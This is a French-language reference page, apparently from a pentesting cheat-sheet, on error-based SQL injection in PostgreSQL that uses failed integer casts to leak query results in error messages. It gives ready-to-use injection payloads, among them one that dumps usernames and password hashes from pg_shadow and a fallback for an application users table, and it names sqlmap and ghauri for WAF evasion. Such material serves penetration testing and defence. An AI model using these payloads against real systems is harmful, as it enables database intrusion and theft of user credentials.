---
title: "Injection PostgreSQL basée sur les erreurs avec échecs de cast"
description: "Fuiter des résultats de requête PostgreSQL via des erreurs de conversion de type CAST(... AS int), qui citent la valeur fautive complète dans le message d'erreur."
keywords:
  - erreur de cast
  - invalid input syntax for type integer
  - injection basée sur les erreurs
  - fuite de données PostgreSQL
---

# Erreur de cast

Convertir du texte non numérique en entier échoue dans PostgreSQL avec `invalid input syntax for type integer: "<text>"`, et le message inclut le texte qui n'a pas pu être converti. Injecter une sous-requête dans ce cast affiche le résultat de la sous-requête dans l'erreur.

Placez la sous-requête dans un cast à l'intérieur de la condition injectée :

```sql
' AND 1=CAST((SELECT version()) AS INT)-- 
```

La réponse porte `ERROR: invalid input syntax for type integer: "PostgreSQL 16.1 on x86_64-pc-linux-gnu, ..."`. Le raccourci `::int` fonctionne de la même manière :

```sql
' AND 1=(SELECT version())::int-- 
```

Toute sous-requête à valeur unique fuite via le même emplacement, et comme il n'y a pas de limite de longueur, un dump agrégé revient en une seule requête. Pour lire des identifiants là où le rôle peut les voir :

```sql
' AND 1=CAST((SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow) AS INT)-- 
```

`pg_shadow` nécessite un superutilisateur ; face à un rôle non privilégié, agrégez plutôt une table applicative (`SELECT string_agg(username||':'||password,',') FROM users`). Gardez la requête interne à une valeur unique (un agrégat, ou `LIMIT 1`), car une sous-requête multi-lignes utilisée comme scalaire déclenche une erreur différente qui ne porte aucune donnée.

## Outils

- **sqlmap** : extraction automatisée basée sur les erreurs via les échecs de cast.
- **ghauri** : alternative rapide avec une forte évasion de WAF.

## Références

- PostgreSQL Documentation: type casts, `string_agg`, system catalogs
- PortSwigger Web Security Academy: SQL injection cheat sheet
